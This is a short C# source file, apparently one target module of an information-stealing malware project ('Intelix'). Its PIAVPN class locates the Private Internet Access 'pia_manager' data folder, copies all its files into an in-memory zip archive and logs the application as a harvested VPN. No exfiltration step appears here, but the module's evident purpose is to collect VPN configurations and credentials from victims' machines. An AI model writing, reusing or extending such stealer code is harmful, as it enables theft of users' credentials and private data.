using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class PIAVPN : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "pia_manager");
		if (Directory.Exists(text))
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "PIA";
			zip.AddDirectoryFiles(text, "PIAVPN");
			counterApplications.Files.Add(text + " => PIAVPN");
			counterApplications.Files.Add("PIAVPN\\");
			counter.Vpns.Add(counterApplications);
		}
	}
}
